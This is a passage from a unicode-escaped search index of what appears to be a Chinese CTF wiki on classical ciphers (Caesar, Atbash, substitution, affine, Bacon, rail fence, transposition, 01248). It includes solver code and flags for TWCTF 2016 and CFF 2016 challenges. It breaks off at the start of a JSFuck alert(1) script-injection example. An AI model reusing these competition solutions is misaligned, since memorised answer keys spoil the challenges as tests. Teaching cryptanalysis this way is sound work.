\u5bc6\u6587\u5b57\u6bcd\u8868\uff1aDEFGHIJKLMNOPQRSTUVWXYZABC \u4f7f\u7528\u65f6\uff0c\u52a0\u5bc6\u8005\u67e5\u627e\u660e\u6587\u5b57\u6bcd\u8868\u4e2d\u9700\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u6240\u5728\u4f4d\u7f6e\uff0c\u5e76\u4e14\u5199\u4e0b\u5bc6\u6587\u5b57\u6bcd\u8868\u4e2d\u5bf9\u5e94\u7684\u5b57\u6bcd\u3002\u9700\u8981\u89e3\u5bc6\u7684\u4eba\u5219\u6839\u636e\u4e8b\u5148\u5df2\u77e5\u7684\u5bc6\u94a5\u53cd\u8fc7\u6765\u64cd\u4f5c\uff0c\u5f97\u5230\u539f\u6765\u7684\u660e\u6587\u3002\u4f8b\u5982\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5bc6\u6587\uff1aWKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ \u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728 \u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0 \uff1a \u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09 \u504f\u79fb\u91cf\u4e3a 13\uff1a ROT13 \u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09 \u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09 \u6b64\u5916\uff0c\u8fd8\u6709\u8fd8\u6709\u4e00\u79cd\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801 Keyed Caesar\u3002\u5176\u57fa\u672c\u539f\u7406\u662f \u5229\u7528\u4e00\u4e2a\u5bc6\u94a5\uff0c\u5c06\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4e00\u822c\u8f6c\u5316\u4e3a\u5b57\u6bcd\u8868\u5bf9\u5e94\u987a\u5e8f\u7684\u6570\u5b57\uff09\uff0c\u5206\u522b\u4ee5\u8fd9\u4e00\u6570\u5b57\u4e3a\u5bc6\u94a5\u52a0\u5bc6\u660e\u6587\u7684\u6bcf\u4e00\u4f4d\u5b57\u6bcd\u3002 \u8fd9\u91cc\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u5bab\u4fdd\u9e21\u4e01\u961f Crypto 100 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u5bc6\u6587\uff1as0a6u3u1s0bv1a \u5bc6\u94a5\uff1aguangtou \u504f\u79fb\uff1a6,20,0,13,6,19,14,20 \u660e\u6587\uff1ay0u6u3h1y0uj1u","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_4","text":"\u5bf9\u4e8e\u4e0d\u5e26\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u5176\u57fa\u672c\u7684\u7834\u89e3\u65b9\u6cd5\u6709\u4e24\u79cd\u65b9\u5f0f \u904d\u5386 26 \u4e2a\u504f\u79fb\u91cf\uff0c\u9002\u7528\u4e8e\u666e\u904d\u60c5\u51b5 \u5229\u7528\u8bcd\u9891\u5206\u6790\uff0c\u9002\u7528\u4e8e\u5bc6\u6587\u8f83\u957f\u7684\u60c5\u51b5\u3002 \u5176\u4e2d\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u80af\u5b9a\u53ef\u4ee5\u5f97\u5230\u660e\u6587\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u5219\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u660e\u6587\u3002 \u800c\u5bf9\u4e8e\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u4e00\u822c\u6765\u8bf4\u5fc5\u987b\u77e5\u9053\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_5","text":"\u4e00\u822c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u5de5\u5177\uff0c\u5176\u4e2dJPK\u6bd4\u8f83\u901a\u7528\u3002 JPK\uff0c\u53ef\u89e3\u5e26\u5bc6\u94a5\u4e0e\u4e0d\u5e26\u5bc6\u94a5 http://planetcalc.com/1434/ http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php","title":"\u5de5\u5177"},{"location":"crypto/classical/monoalphabetic/#_6","text":"\u4e0e\u51ef\u6492\u5bc6\u7801\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u79fb\u4f4d\u5bc6\u7801\u4e0d\u4ec5\u4f1a\u5904\u7406\u5b57\u6bcd\uff0c\u8fd8\u4f1a\u5904\u7406\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\uff0c\u5e38\u7528 ASCII \u7801\u8868\u8fdb\u884c\u79fb\u4f4d\u3002\u5176\u7834\u89e3\u65b9\u6cd5\u4e5f\u662f\u904d\u5386\u6240\u6709\u7684\u53ef\u80fd\u6027\u6765\u5f97\u5230\u53ef\u80fd\u7684\u7ed3\u679c\u3002","title":"\u79fb\u4f4d\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#atbash-cipher","text":"","title":"Atbash Cipher"},{"location":"crypto/classical/monoalphabetic/#_7","text":"\u57c3\u7279\u5df4\u4ec0\u7801\uff08Atbash Cipher\uff09\u5176\u5b9e\u53ef\u4ee5\u89c6\u4e3a\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u7b80\u5355\u66ff\u6362\u5bc6\u7801\u7684\u7279\u4f8b\uff0c\u5b83\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u3002\u5728\u7f57\u9a6c\u5b57\u6bcd\u8868\u4e2d\uff0c\u5b83\u662f\u8fd9\u6837\u51fa\u73b0\u7684\uff1a \u660e\u6587\uff1aA B C D E F G H I J K L M N O P Q R S T U V W X Y Z \u5bc6\u6587\uff1aZ Y X W V U T S R Q P O N M L K J I H G F E D C B A \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff1a \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1agsv jfrxp yildm ulc qfnkh levi gsv ozab wlt","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_8","text":"\u53ef\u4ee5\u770b\u51fa\u5176\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u77ed\uff0c\u540c\u65f6\u5f53\u5bc6\u6587\u8db3\u591f\u957f\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u91c7\u7528\u8bcd\u9891\u5206\u6790\u7684\u65b9\u6cd5\u89e3\u51b3\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_9","text":"http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/","title":"\u5de5\u5177"},{"location":"crypto/classical/monoalphabetic/#_10","text":"","title":"\u7b80\u5355\u66ff\u6362\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#_11","text":"\u7b80\u5355\u66ff\u6362\u5bc6\u7801\uff08Simple Substitution Cipher\uff09\u52a0\u5bc6\u65f6\uff0c\u5c06\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u66ff\u6362\u4e3a\u4e0e\u4e4b\u552f\u4e00\u5bf9\u5e94\u4e14\u4e0d\u540c\u7684\u5b57\u6bcd\u3002\u5b83\u4e0e\u607a\u6492\u5bc6\u7801\u4e4b\u95f4\u7684\u533a\u522b\u662f\u5176\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u5b57\u6bcd\u4e0d\u662f\u7b80\u5355\u7684\u79fb\u4f4d\uff0c\u800c\u662f\u5b8c\u5168\u662f\u6df7\u4e71\u7684\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5176\u7834\u89e3\u96be\u5ea6\u8981\u9ad8\u4e8e\u51ef\u6492\u5bc6\u7801\u3002 \u6bd4\u5982\uff1a \u660e\u6587\u5b57\u6bcd : abcdefghijklmnopqrstuvwxyz \u5bc6\u94a5\u5b57\u6bcd : phqgiumeaylnofdxjkrcvstzwb a \u5bf9\u5e94 p\uff0cd \u5bf9\u5e94 h\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1acei jvaql hkdtf udz yvoxr dsik cei npbw gdm \u800c\u89e3\u5bc6\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u662f\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684\u5bf9\u5e94\u89c4\u5219\uff0c\u624d\u53ef\u4ee5\u6b63\u5e38\u89e3\u5bc6\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_12","text":"\u7531\u4e8e\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5bfc\u81f4\u5176\u6240\u6709\u7684\u5bc6\u94a5\u4e2a\u6570\u662f 26! 26! \uff0c\u6240\u4ee5\u51e0\u4e4e\u4e0a\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7684\u89e3\u51b3\u65b9\u5f0f\u3002\u6240\u4ee5\u6211\u4eec \u4e00\u822c\u91c7\u7528\u8bcd\u9891\u5206\u6790\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_13","text":"http://quipqiup.com/","title":"\u5de5\u5177"},{"location":"crypto/classical/monoalphabetic/#_14","text":"","title":"\u4eff\u5c04\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#_15","text":"\u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u51fd\u6570\u662f E(x)=(ax+b)\\pmod m E(x)=(ax+b)\\pmod m \uff0c\u5176\u4e2d x x \u8868\u793a\u660e\u6587\u6309\u7167\u67d0\u79cd\u7f16\u7801\u5f97\u5230\u7684\u6570\u5b57 a a \u548c m m \u4e92\u8d28 m m \u662f\u7f16\u7801\u7cfb\u7edf\u4e2d\u5b57\u6bcd\u7684\u6570\u76ee\u3002 \u89e3\u5bc6\u51fd\u6570\u662f D(x)=a^{-1}(x-b)\\pmod m D(x)=a^{-1}(x-b)\\pmod m \uff0c\u5176\u4e2d a^{-1} a^{-1} \u662f a a \u5728 \\mathbb{Z}_{m} \\mathbb{Z}_{m} \u7fa4\u7684\u4e58\u6cd5\u9006\u5143\u3002 \u4e0b\u9762\u6211\u4eec\u4ee5 E(x) = (5x + 8) \\bmod 26 E(x) = (5x + 8) \\bmod 26 \u51fd\u6570\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\uff0c\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e3a AFFINE CIPHER \uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u91c7\u7528\u5b57\u6bcd\u886826\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u7f16\u7801\u7cfb\u7edf \u660e\u6587 A F F I N E C I P H E R x 0 5 5 8 13 4 2 8 15 7 4 17 y=5x+8 y=5x+8 8 33 33 48 73 28 18 48 83 43 28 93 y\\mod26 y\\mod26 8 7 7 22 21 2 18 22 5 17 2 15 \u5bc6\u6587 I H H W V C S W F R C P \u5176\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u662f IHHWVCSWFRCP \u3002 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u6b63\u5e38\u89e3\u5bc6\u8005\u5177\u6709a\u4e0eb\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 a^{-1} a^{-1} \u4e3a 21\uff0c\u6240\u4ee5\u5176\u89e3\u5bc6\u51fd\u6570\u662f D(x)=21(x-8)\\pmod {26} D(x)=21(x-8)\\pmod {26} \uff0c\u89e3\u5bc6\u5982\u4e0b \u5bc6\u6587 I H H W V C S W F R C P y y 8 7 7 22 21 2 18 22 5 17 2 15 x=21(y-8) x=21(y-8) 0 -21 -21 294 273 -126 210 294 -63 189 -126 147 x\\mod26 x\\mod26 0 5 5 8 13 4 2 8 15 7 4 17 \u660e\u6587 A F F I N E C I P H E R \u53ef\u4ee5\u770b\u51fa\u5176\u7279\u70b9\u5728\u4e8e\u53ea\u6709 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_16","text":"\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u4eff\u5c04\u5bc6\u7801\u5bf9\u4e8e\u4efb\u610f\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u6bcd\uff0c\u5176\u6700\u540e\u5f97\u5230\u7684\u5bc6\u6587\u5fc5\u7136\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5176\u4e5f\u5177\u6709\u6700\u901a\u7528\u7684\u7279\u70b9\u3002\u5f53\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9891\u7387\u5206\u6790\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4f55\u653b\u51fb\u8be5\u5bc6\u7801\u3002\u53ef\u4ee5\u770b\u51fa\u5f53 a=1 a=1 \u65f6\uff0c\u4eff\u5c04\u52a0\u5bc6\u662f\u51ef\u6492\u52a0\u5bc6\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u4eff\u5c04\u5bc6\u7801\u65f6\uff0c\u5176\u5b57\u7b26\u96c6\u90fd\u7528\u7684\u662f\u5b57\u6bcd\u8868\uff0c\u4e00\u822c\u53ea\u670926\u4e2a\u5b57\u6bcd\uff0c\u800c\u4e0d\u5927\u4e8e26\u7684\u4e0e26\u4e92\u7d20\u7684\u4e2a\u6570\u4e00\u5171\u6709 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \u7b97\u4e0ab\u7684\u504f\u79fb\u53ef\u80fd\uff0c\u4e00\u5171\u6709\u53ef\u80fd\u7684\u5bc6\u94a5\u7a7a\u95f4\u5927\u5c0f\u4e5f\u5c31\u662f 12 \\times 26 = 312 12 \\times 26 = 312 \u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u8be5\u79cd\u5bc6\u7801\uff0c\u6211\u4eec\u81f3\u5c11\u5f97\u662f\u5728\u5df2\u77e5\u90e8\u5206\u660e\u6587\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u653b\u51fb\u3002\u4e0b\u9762\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\u3002 \u8fd9\u79cd\u5bc6\u7801\u7531\u4e24\u79cd\u53c2\u6570\u6765\u63a7\u5236\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u53c2\u6570\uff0c\u90a3\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5feb\u901f\u679a\u4e3e\u53e6\u5916\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7b54\u6848\u3002 \u4f46\u662f\uff0c\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u91c7\u7528\u7684\u5b57\u6bcd\u96c6\uff0c\u8fd9\u91cc\u5047\u8bbe\u4e3a26\u4e2a\u5b57\u6bcd\uff0c\u6211\u4eec\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u89e3\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd y_1,y_2 y_1,y_2 \u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002\u90a3\u4e48\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053 y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} \u4e24\u5f0f\u76f8\u51cf\uff0c\u53ef\u5f97 y_1-y_2=a(x_1-x_2)\\pmod{26} y_1-y_2=a(x_1-x_2)\\pmod{26} \u8fd9\u91cc y_1,y_2 y_1,y_2 \u5df2\u77e5\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5bc6\u6587\u5bf9\u5e94\u7684\u4e24\u4e2a\u4e0d\u4e00\u6837\u7684\u5b57\u7b26 x_1 x_1 \u4e0e x_2 x_2 \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u5f97\u5230 a a \uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u5f97\u5230 b b \u4e86\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_17","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5TWCTF 2016 \u7684 super_express\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u7ed9\u7684\u6e90\u7801 import sys key = '****CENSORED***************' flag = 'TWCTF{*******CENSORED********}' if len ( key ) % 2 == 1 : print ( \"Key Length Error\" ) sys . exit ( 1 ) n = len ( key ) / 2 encrypted = '' for c in flag : c = ord ( c ) for a , b in zip ( key [ 0 : n ], key [ n : 2 * n ]): c = ( ord ( a ) * c + ord ( b )) % 251 encrypted += ' %02x ' % c print encrypted \u53ef\u4ee5\u53d1\u73b0\uff0c\u867d\u7136\u5bf9\u4e8e flag \u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u52a0\u5bc6\u4e86 n \u6b21\uff0c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \u6839\u636e\u7b2c\u4e8c\u884c\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5176\u5b9e c_n\u200b c_n\u200b \u4e5f\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u770b\u6210 c_n=xc+y\u200b c_n=xc+y\u200b \uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0ckey \u662f\u59cb\u7ec8\u4e0d\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8bf4\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662f\u4eff\u5c04\u5bc6\u7801\u3002 \u6b64\u5916\uff0c\u9898\u76ee\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u5bc6\u6587\u4ee5\u53ca\u90e8\u5206\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5f88\u5bb9\u6613\u5229\u7528\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u653b\u51fb\u4e86\uff0c\u5229\u7528\u4ee3\u7801\u5982\u4e0b import gmpy key = '****CENSORED****************' flag = 'TWCTF{*******CENSORED********}' f = open ( 'encrypted' , 'r' ) data = f . read () . strip ( ' \\n ' ) encrypted = [ int ( data [ i : i + 2 ], 16 ) for i in range ( 0 , len ( data ), 2 )] plaindelta = ord ( flag [ 1 ]) - ord ( flag [ 0 ]) cipherdalte = encrypted [ 1 ] - encrypted [ 0 ] a = gmpy . invert ( plaindelta , 251 ) * cipherdalte % 251 b = ( encrypted [ 0 ] - a * ord ( flag [ 0 ])) % 251 a_inv = gmpy . invert ( a , 251 ) result = \"\" for c in encrypted : result += chr (( c - b ) * a_inv % 251 ) print result \u7ed3\u679c\u5982\u4e0b \u279c TWCTF2016-super_express git: ( master ) \u2717 python exploit.py TWCTF { Faster_Than_Shinkansen! }","title":"\u4f8b\u5b50"},{"location":"crypto/classical/others/","text":"\u57f9\u6839\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u57f9\u6839\u5bc6\u7801\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u5b57\u4f53\uff0c\u4ee3\u8868 A \u548c B\uff0c\u7ed3\u5408\u52a0\u5bc6\u8868\u8fdb\u884c\u52a0\u89e3\u5bc6\u3002 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB \u4e0a\u9762\u7684\u662f\u5e38\u7528\u7684\u52a0\u5bc6\u8868\u3002\u8fd8\u6709\u53e6\u5916\u7684\u4e00\u79cd\u52a0\u5bc6\u8868\uff0c\u53ef\u8ba4\u4e3a\u662f\u5c06 26 \u4e2a\u5b57\u6bcd\u4ece 0 \u5230 25 \u6392\u5e8f\uff0c\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff0cA \u4ee3\u8868 0\uff0cB \u4ee3\u8868 1\u3002 \u4e0b\u9762\u8fd9\u4e00\u6bb5\u5185\u5bb9\u5c31\u662f\u660e\u6587 steganography \u52a0\u5bc6\u540e\u7684\u5185\u5bb9\uff0c\u6b63\u5e38\u5b57\u4f53\u662f A\uff0c\u7c97\u4f53\u662f B\uff1a T o en co de a mes s age e ac h letter of the pl a i nt ex t i s replaced b y a g rou p of f i ve of th e lett ers 'A' o r 'B' . \u53ef\u4ee5\u770b\u5230\uff0c\u57f9\u6839\u5bc6\u7801\u4e3b\u8981\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709\u4e24\u79cd\u5b57\u7b26 \u6bcf\u4e00\u6bb5\u7684\u957f\u5ea6\u4e3a 5 \u52a0\u5bc6\u5185\u5bb9\u4f1a\u6709\u7279\u6b8a\u7684\u5b57\u4f53\u4e4b\u5206\uff0c\u4ea6\u6216\u8005\u5927\u5c0f\u5199\u4e4b\u5206\u3002 \u5de5\u5177 \u00b6 http://rumkin.com/tools/cipher/baconian.php \u6805\u680f\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u6805\u680f\u5bc6\u7801\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210 N \u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c 1 \u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aTHERE IS A CIPHER \u53bb\u6389\u7a7a\u683c\u540e\u53d8\u4e3a THEREISACIPHER \u5206\u6210\u4e24\u680f\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5f97\u5230 TH ER EI SA CI PH ER \u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u518d\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u6bcd TEESCPE HRIAIHR \u8fde\u5728\u4e00\u8d77\u5c31\u662f TEESCPEHRIAIHR \u4e0a\u8ff0\u660e\u6587\u4e5f\u53ef\u4ee5\u5206\u4e3a2\u680f\u3002 THEREIS ACIPHER \u7ec4\u5408\u5f97\u5230\u5bc6\u6587 TAHCEIRPEHIESR \u5de5\u5177 \u00b6 \u5f85\u8865\u5145\u3002 \u66f2\u8def\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u66f2\u8def\u5bc6\u7801\uff08Curve Cipher\uff09\u662f\u4e00\u79cd\u6362\u4f4d\u5bc6\u7801\uff0c\u9700\u8981\u4e8b\u5148\u53cc\u65b9\u7ea6\u5b9a\u5bc6\u94a5\uff08\u4e5f\u5c31\u662f\u66f2\u8def\u8def\u5f84\uff09\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog \u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u52a0\u5bc6\u7684\u56de\u8def\u7ebf\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u5bc6\u6587\uff1agesfc inpho dtmwu qoury zejre hbxva lookT \u5217\u79fb\u4f4d\u52a0\u5bc6 \u00b6 \u539f\u7406 \u00b6 \u5217\u79fb\u4f4d\u5bc6\u7801\uff08Columnar Transposition Cipher\uff09\u662f\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\u7684\u6362\u4f4d\u5bc6\u7801\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u89c4\u5219\u5c06\u660e\u6587\u6253\u4e71\u6df7\u5408\u6210\u5bc6\u6587\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 \u6211\u4eec\u4ee5\u660e\u6587 The quick brown fox jumps over the lazy dog \uff0c\u5bc6\u94a5 how are u \u4e3a\u4f8b\uff1a \u5c06\u660e\u6587\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff0c\u5982\u679c\u660e\u6587\u4e0d\u80fd\u586b\u5145\u5b8c\u8868\u683c\u53ef\u4ee5\u7ea6\u5b9a\u4f7f\u7528\u67d0\u4e2a\u5b57\u6bcd\u8fdb\u884c\u586b\u5145\uff09 \u5bc6\u94a5\uff1a how are u \uff0c\u6309 how are u \u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u51fa\u73b0\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u7f16\u53f7\uff0c\u6211\u4eec\u5c31\u6709 a \u4e3a 1\uff0ce \u4e3a 2\uff0ch \u4e3a 3\uff0co \u4e3a 4\uff0cr \u4e3a 5\uff0cu \u4e3a 6\uff0cw \u4e3a 7\uff0c\u6240\u4ee5\u5148\u5199\u51fa a \u5217\uff0c\u5176\u6b21 e \u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5199\u51fa\u7684\u7ed3\u679c\u4fbf\u662f\u5bc6\u6587\uff1a \u5bc6\u6587\uff1a qoury inpho Tkool hbxva uwmtd cfseg erjez \u5de5\u5177 \u00b6 http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ \u884c\u5217\u6570\u76f8\u7b49 01248 \u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u8be5\u5bc6\u7801\u53c8\u79f0\u4e3a\u4e91\u5f71\u5bc6\u7801\uff0c\u4f7f\u7528 0\uff0c1\uff0c2\uff0c4\uff0c8 \u56db\u4e2a\u6570\u5b57\uff0c\u5176\u4e2d 0 \u7528\u6765\u8868\u793a\u95f4\u9694\uff0c\u5176\u4ed6\u6570\u5b57\u4ee5\u52a0\u6cd5\u53ef\u4ee5\u8868\u793a\u51fa \u5982\uff1a28=10\uff0c124=7\uff0c18=9\uff0c\u518d\u7528 1->26 \u8868\u793a A->Z\u3002 \u53ef\u4ee5\u770b\u51fa\u8be5\u5bc6\u7801\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709 0\uff0c1\uff0c2\uff0c4\uff0c8 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5CFF 2016 \u5f71\u4e4b\u5bc6\u7801\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee 8842101220480224404014224202480122 \u6211\u4eec\u6309\u71670\u6765\u8fdb\u884c\u5206\u5272\uff0c\u5982\u4e0b \u5185\u5bb9 \u6570\u5b57 \u5b57\u7b26 88421 8+8+4+2+1=23 W 122 1+2+2=5 E 48 4+8=12 L 2244 2+2+4+4=12 L 4 4 D 142242 1+4+2+2+4+2=15 O 248 2+4+8=14 N 122 1+2+2=5 E \u6240\u4ee5\u6700\u540e\u7684 flag \u4e3a WELLDONE\u3002 JSFuck \u00b6 \u539f\u7406 \u00b6 JSFuck \u53ef\u4ee5\u53ea\u7528 6 \u4e2a\u5b57\u7b26 []()!+ \u6765\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u6bd4\u5982\u6211\u4eec\u60f3\u7528 JSFuck \u6765\u5b9e\u73b0 alert(1) \u4ee3\u7801\u5982\u4e0b [][( ! [] + 